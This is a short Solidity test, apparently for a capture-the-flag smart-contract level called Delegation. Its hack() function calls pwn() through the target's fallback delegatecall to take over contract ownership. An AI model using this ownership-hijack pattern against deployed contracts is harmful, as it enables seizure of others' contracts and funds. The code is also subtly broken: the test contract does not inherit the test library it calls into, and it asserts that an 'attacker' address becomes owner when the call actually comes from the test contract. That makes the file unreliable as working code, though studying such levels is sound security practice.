// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";

import {Delegation, Delegate} from "../src/Delegation.sol";

contract DelegationTest {
    Delegation public target;
    Delegate public delegate;
    address owner;

    constructor() {
        owner = makeAddr("owner");
        delegate = new Delegate(owner);
        target = new Delegation(address(delegate));
    }

    function hack() public {
        address attacker = makeAddr("attacker");
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool result, ) = address(target).call(data);
        assert(result);

        address ownerAfter = target.owner();
        assertEq(ownerAfter, attacker);
    }
}
